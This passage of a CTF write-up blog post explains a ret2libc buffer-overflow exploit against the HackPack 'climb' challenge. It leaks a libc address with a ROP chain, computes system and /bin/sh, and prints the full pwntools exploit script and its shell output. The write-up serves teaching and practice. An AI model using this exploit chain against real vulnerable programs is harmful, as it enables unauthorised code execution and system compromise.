<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"Leaked libc address, Puts: %s"</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">leak</span><span class="p">))</span>
</code></pre></div></div>
<p>Then combining this to my <code class="highlighter-rouge">part1</code> exploit I got the address leak of <code class="highlighter-rouge">puts</code>.</p>

<p><strong>Output:-</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python3</span> <span class="n">part1_exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">cha</span><span class="o">.</span><span class="n">hackpack</span><span class="o">.</span><span class="n">club</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">41702</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/gr4n173/climb'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="mi">16</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="s">'./climb'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="o">@</span><span class="n">plt</span><span class="p">:</span> <span class="mh">0x40050c</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="p">:</span> <span class="mh">0x601018</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="p">:</span> <span class="mh">0x400743</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">libc</span> <span class="n">address</span><span class="p">,</span> <span class="n">Puts</span><span class="p">:</span> <span class="mh">0x7f6662f2b9c0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">EOF</span> <span class="k">while</span> <span class="n">reading</span> <span class="ow">in</span> <span class="n">interactive</span>
</code></pre></div></div>

<p>Hm… Cool,right? By overflowing the buffer, poping the argument, pointing to got and plt of <code class="highlighter-rouge">puts</code> address I finally leaked address of <code class="highlighter-rouge">puts</code> from libc.</p>

<p>And another thing was, every time when exploit was run,I got the different address except the last <code class="highlighter-rouge">3 bytes</code> of the <code class="highlighter-rouge">puts</code> leaked address remains same. So that helped me to find a version of libc. In order to find the libc verion you can use this website <a href="https://libc.blukat.me/">Find libc version here</a>. By using this, libc verison was shown and file was downloaded.</p>

<p><img src="/public/images/ctf/libc_version_climb.png" alt="libc" /></p>

<p>From above, libc version was <code class="highlighter-rouge">libc6_2.27-3ubuntu1_amd64</code> and got a shell after buffer was overflowed.</p>

<p>One thing to remember about the address of the function like <code class="highlighter-rouge">system</code>, <code class="highlighter-rouge">puts</code>, <code class="highlighter-rouge">printf</code> etc.,inside the libc is, it just shift the address a bit from the <code class="highlighter-rouge">libc base</code> address. So by subracting puts leak address with actual address of <code class="highlighter-rouge">puts</code> from <code class="highlighter-rouge">libc</code> I got the base address of the libc.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">libc</span><span class="o">.</span><span class="nx">address</span> <span class="o">=</span> <span class="nx">leak</span> <span class="o">-</span> <span class="nx">libc</span><span class="o">.</span><span class="nx">sym</span><span class="p">[</span><span class="s2">"puts"</span><span class="p">]</span>
<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"Base address of libc: %s "</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">libc</span><span class="o">.</span><span class="nx">address</span><span class="p">))</span>
</code></pre></div></div>
<p><strong>Output: -</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="nx">python3</span> <span class="nx">part1_exploit</span><span class="o">.</span><span class="nx">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Opening</span> <span class="nx">connection</span> <span class="nx">to</span> <span class="nx">cha</span><span class="o">.</span><span class="nx">hackpack</span><span class="o">.</span><span class="nx">club</span> <span class="nx">on</span> <span class="nx">port</span> <span class="mi">41702</span><span class="o">:</span> <span class="nx">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/gr4n173/climb'</span>
    <span class="nx">Arch</span><span class="o">:</span>     <span class="nx">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="nx">little</span>
    <span class="nx">RELRO</span><span class="o">:</span>    <span class="nx">Partial</span> <span class="nx">RELRO</span>
    <span class="nx">Stack</span><span class="o">:</span>    <span class="nx">No</span> <span class="nx">canary</span> <span class="nx">found</span>
    <span class="nx">NX</span><span class="o">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
    <span class="nx">PIE</span><span class="o">:</span>      <span class="nx">No</span> <span class="nx">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">'/home/gr4n173/libc6_2.27-3ubuntu1_amd64.so'</span>
    <span class="nx">Arch</span><span class="o">:</span>     <span class="nx">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="nx">little</span>
    <span class="nx">RELRO</span><span class="o">:</span>    <span class="nx">Partial</span> <span class="nx">RELRO</span>
    <span class="nx">Stack</span><span class="o">:</span>    <span class="nx">Canary</span> <span class="nx">found</span>
    <span class="nx">NX</span><span class="o">:</span>       <span class="nx">NX</span> <span class="nx">enabled</span>
    <span class="nx">PIE</span><span class="o">:</span>      <span class="nx">PIE</span> <span class="nx">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Loaded</span> <span class="mi">16</span> <span class="nx">cached</span> <span class="nx">gadgets</span> <span class="k">for</span> <span class="s1">'./climb'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">puts</span><span class="o">@</span><span class="nx">plt</span><span class="o">:</span> <span class="mh">0x40050c</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">__libc_start_main</span><span class="o">:</span> <span class="mh">0x601018</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">pop</span> <span class="nx">rdi</span> <span class="nx">gadget</span><span class="o">:</span> <span class="mh">0x400743</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">rdi</span><span class="o">:</span> <span class="mh">0x4004fe</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Leaked</span> <span class="nx">libc</span> <span class="nx">address</span><span class="p">,</span> <span class="nx">Puts</span><span class="o">:</span> <span class="mh">0x7f03f04ea9c0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Base</span> <span class="nx">address</span> <span class="nx">of</span> <span class="nx">libc</span><span class="o">:</span> <span class="mh">0x7f03f046a000</span>
</code></pre></div></div>

<p>Now with this libc version I found a <code class="highlighter-rouge">system</code> and <code class="highlighter-rouge">bin/sh</code> address to get a shell. You can use <a href="https://github.com/david942j/one_gadget">one_gadget</a> directly to get a shell but I mostly use <code class="highlighter-rouge">system</code> more to get know knowledge about the address of <code class="highlighter-rouge">system</code> and <code class="highlighter-rouge">binsh</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">BINSH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="nx">libc</span><span class="o">.</span><span class="nx">search</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">))</span> <span class="c1">#Verify with find /bin/sh libc6_2.27-3ubuntu1_amd64.so</span>
<span class="nx">SYSTEM</span> <span class="o">=</span> <span class="nx">libc</span><span class="o">.</span><span class="nx">sym</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>

<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"bin/sh: %s "</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">BINSH</span><span class="p">))</span>
<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"system: %s "</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">SYSTEM</span><span class="p">))</span>
</code></pre></div></div>

<p>One thing to notice before this; we have to return to <code class="highlighter-rouge">main</code> so that we can overflow the function and get a shell. Hence my <code class="highlighter-rouge">part2_exploit</code> was</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">received</span> <span class="o">=</span> <span class="nx">p</span><span class="o">.</span><span class="nx">recvline</span><span class="p">()</span><span class="o">.</span><span class="nx">strip</span><span class="p">()</span>
<span class="nx">leak</span> <span class="o">=</span>  <span class="nx">u64</span><span class="p">(</span><span class="nx">received</span><span class="o">.</span><span class="nx">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="nx">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"Leaked libc address, Puts: %s"</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">leak</span><span class="p">))</span>

<span class="nx">libc</span><span class="o">.</span><span class="nx">address</span> <span class="o">=</span> <span class="nx">leak</span> <span class="o">-</span> <span class="nx">libc</span><span class="o">.</span><span class="nx">sym</span><span class="p">[</span><span class="s2">"puts"</span><span class="p">]</span>
<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"Base address of libc: %s "</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">libc</span><span class="o">.</span><span class="nx">address</span><span class="p">))</span>

<span class="nx">BINSH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="nx">libc</span><span class="o">.</span><span class="nx">search</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">))</span> 
<span class="nx">SYSTEM</span> <span class="o">=</span> <span class="nx">libc</span><span class="o">.</span><span class="nx">sym</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>

<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"bin/sh: %s "</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">BINSH</span><span class="p">))</span>
<span class="nb">log</span><span class="o">.</span><span class="nx">info</span><span class="p">(</span><span class="s2">"system: %s "</span> <span class="o">%</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">SYSTEM</span><span class="p">))</span>

<span class="nx">payload2</span> <span class="o">=</span> <span class="nx">OFFSET</span> 
<span class="nx">payload2</span> <span class="o">+=</span> <span class="nx">p64</span><span class="p">(</span><span class="nx">RET</span><span class="p">)</span> 
<span class="nx">payload2</span> <span class="o">+=</span> <span class="nx">p64</span><span class="p">(</span><span class="nx">POP_RDI</span><span class="p">)</span> 
<span class="nx">payload2</span> <span class="o">+=</span> <span class="nx">p64</span><span class="p">(</span><span class="nx">BINSH</span><span class="p">)</span> 
<span class="nx">payload2</span> <span class="o">+=</span> <span class="nx">p64</span><span class="p">(</span><span class="nx">SYSTEM</span><span class="p">)</span>

<span class="nx">p</span><span class="o">.</span><span class="nx">recvuntil</span><span class="p">(</span><span class="s2">"How will you respond? "</span><span class="p">))</span>

<span class="nx">p</span><span class="o">.</span><span class="nx">sendline</span><span class="p">(</span><span class="nx">payload2</span><span class="p">)</span>
</code></pre></div></div>

<p>In payload2, I used <code class="highlighter-rouge">RET</code> to make stack 16 bytes aligned by popping off 8 bytes off top of stack and returning to it.</p>

<p>So combining the <code class="highlighter-rouge">part1</code> and <code class="highlighter-rouge">part2</code> exploit my final exploit becomes</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python
# (combined)exploit.py
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Import pwntools
</span>
<span class="n">p</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'cha.hackpack.club'</span><span class="p">,</span><span class="mi">41702</span><span class="p">)</span>
<span class="c1">#p = process("./climb") 
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./climb"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"libc6_2.27-3ubuntu1_amd64.so"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span><span class="c1"># Find ROP gadgets
</span>
<span class="n">PUTS_PLT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
<span class="n">PUTS_GOT</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span><span class="c1"># Same as ROPgadget --binary vuln | grep "pop rdi"
</span><span class="n">RET</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Puts@glt : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"rdi: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">RET</span><span class="p">))</span>

<span class="c1">#Overflow buffer until return address
</span><span class="n">OFFSET</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#+ "B"*8
</span>
<span class="c1"># Create rop chain
</span><span class="n">payload1</span> <span class="o">=</span> <span class="n">OFFSET</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_GOT</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS_PLT</span><span class="p">)</span> 
<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

<span class="c1">#Send our rop-chain payload
</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How will you respond? "</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>

<span class="c1">#Parse leaked address
</span><span class="n">recieved</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span>  <span class="n">u64</span><span class="p">(</span><span class="n">recieved</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leaked libc address, Puts: </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Base address of libc: </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">BINSH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span> 
<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"bin/sh: </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BINSH</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system: </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

<span class="n">payload2</span> <span class="o">=</span> <span class="n">OFFSET</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">)</span> 
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How will you respond? "</span><span class="p">))</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p><strong>Output: -</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">cha</span><span class="o">.</span><span class="n">hackpack</span><span class="o">.</span><span class="n">club</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">41702</span><span class="p">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/gr4n173/climb'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s">'/home/gr4n173/libc6_2.27-3ubuntu1_amd64.so'</span>
    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="mi">16</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="s">'./climb'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Puts</span><span class="o">@</span><span class="n">plt</span><span class="p">:</span> <span class="mh">0x40050c</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Puts</span><span class="o">@</span><span class="n">glt</span> <span class="p">:</span> <span class="mh">0x601018</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="p">:</span> <span class="mh">0x400743</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">rdi</span><span class="p">:</span> <span class="mh">0x4004fe</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">libc</span> <span class="n">address</span><span class="p">,</span> <span class="n">Puts</span><span class="p">:</span> <span class="mh">0x7ff0e807a9c0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Base</span> <span class="n">address</span> <span class="n">of</span> <span class="n">libc</span><span class="p">:</span> <span class="mh">0x7ff0e7ffa000</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mh">0x7ff0e81ade9a</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">system</span><span class="p">:</span> <span class="mh">0x7ff0e8049440</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="err">$</span> <span class="n">ls</span>
<span class="n">climb</span>
<span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
<span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
<span class="n">flag</span><span class="p">{</span><span class="n">w0w_A_R34L_LiF3_R0pp3r</span><span class="err">!</span><span class="p">}</span>
<span class="err">$</span>
</code></pre></div></div>

<h1 id="conclusion">Conclusion</h1>
<p>In this part of <code class="highlighter-rouge">Exploitation&amp;Pwning</code> Series here I tried to explain about the <code class="highlighter-rouge">ret2libc</code> exploit. At first I overflowed the <code class="highlighter-rouge">buffer</code> and called to <code class="highlighter-rouge">got</code> address to leak the address of related function. Later I returned back to main so that I can use the overflow function again and get a shell by using <code class="highlighter-rouge">system and binsh</code> from <code class="highlighter-rouge">libc</code>.</p>

<p>Stay updated to my blog. I will be posting next writeup soon about <code class="highlighter-rouge">Exploitation&amp;Pwning</code> series posts. Last but not the least I would like to thank all my readers for staying with me till here.</p>

<p>Feedbacks are really appreciated in the comments below.</p>

<p>Stay safe.</p>

<p>Keep learning.</p>


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'gr4n173'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2020/05/16/htb-patents.html">
          Hack The Box: Patents
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/05/01/hackpack-ctf-pwn.html">
          HackPack CTF: Pwn Challenge
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/04/18/htb-mango.html">
          Hack The Box: Mango
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/bof/" class="set-1">BoF</a> <a href="/tag/explotation%26pwning/" class="set-1">Explotation&Pwning</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/lfi-posioning/" class="set-1">LFI-posioning</a> <a href="/tag/nosql/" class="set-1">Nosql</a> <a href="/tag/phpjuggler/" class="set-1">PhpJuggler</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/rop/" class="set-1">ROP</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/ssti/" class="set-1">SSTI</a> <a href="/tag/vscctf/" class="set-1">VSCCTF</a> <a href="/tag/virseccon/" class="set-1">VirSecCon</a> <a href="/tag/xxe/" class="set-1">XXE</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/boltcms/" class="set-1">boltcms</a> <a href="/tag/csrftorce/" class="set-1">csrftorce</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/hackpackctf/" class="set-1">hackpackctf</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/jjs/" class="set-1">jjs</a> <a href="/tag/lfmserver/" class="set-1">lfmserver</a> <a href="/tag/linux/" class="set-4">linux</a> <a href="/tag/linxu/" class="set-1">linxu</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/mongodb/" class="set-1">mongodb</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/port-forward/" class="set-1">port-forward</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwn/" class="set-2">pwn</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/restic-server/" class="set-1">restic-server</a> <a href="/tag/ret2libc/" class="set-1">ret2libc</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/scripting/" class="set-1">scripting</a> <a href="/tag/selenium/" class="set-1">selenium</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/virseccon/" class="set-1">virseccon</a> <a href="/tag/webchallenge/" class="set-1">webchallenge</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whoami/" class="set-1">whoami</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
  




      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
	  <center><script src="https://www.hackthebox.eu/badge/60443"></script> </center><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');
if (theme === 'undefined') {
   theme = "dark";
}
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
